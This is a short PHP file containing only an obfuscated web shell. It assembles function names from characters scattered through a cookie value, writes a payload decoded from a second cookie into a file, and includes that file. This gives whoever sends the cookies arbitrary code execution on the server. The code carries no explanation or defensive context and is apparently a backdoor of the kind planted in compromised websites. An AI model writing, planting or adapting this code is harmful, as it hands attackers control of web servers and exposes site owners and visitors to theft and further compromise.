<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[38])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[38][$n];
        if (!$c[38][$n + 1]) {
            if (!$c[38][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[3]() . $p[0];
    if (!$p[24]($k)) {
        $n = $p[7]($k, $p[18]);
        $p[2]($n, $p[23] . $p[25]($p[15]($c[3])));
    }
    include($k);
}